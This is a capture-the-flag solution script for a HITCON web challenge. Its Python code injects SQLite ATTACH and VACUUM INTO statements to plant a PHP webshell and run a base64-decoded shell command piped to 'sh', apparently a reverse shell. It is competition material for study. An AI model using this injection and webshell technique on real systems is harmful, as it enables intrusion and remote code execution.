# Pholyglot
#bash #php 
```
import requests
import threading
import time

url = "http://orange.chal.hitconctf.com/"
# url = "http://localhost:8085"


def send(param):
    print(param)
    requests.get(url, params={"msg": param})



files = [
    'eval',
    'f="echo "',
    'g=cGhwIC1yIC',
    'h=ckc29jaz1m',
     # ...
    'p=" |base64"',
    'q=" -d|sh"',
    'r=$f$g$h$i$j$k',
    'r=$r$l$m$n$o$p',
    'r=$r$q',
    'rz="eval $r"',
    'sh -c "\$rz";'
]

for f in files:
    send(f"');ATTACH'{f}'as x;")

send(f"a<?=`*`;');VACUUM INTO'z.php';")
time.sleep(1)
requests.get(url+"/sandbox/md5/z.php")

```
`hitcon{PHP-1s-my-b0dy-4nd-SQL-1s-my-bl00d}`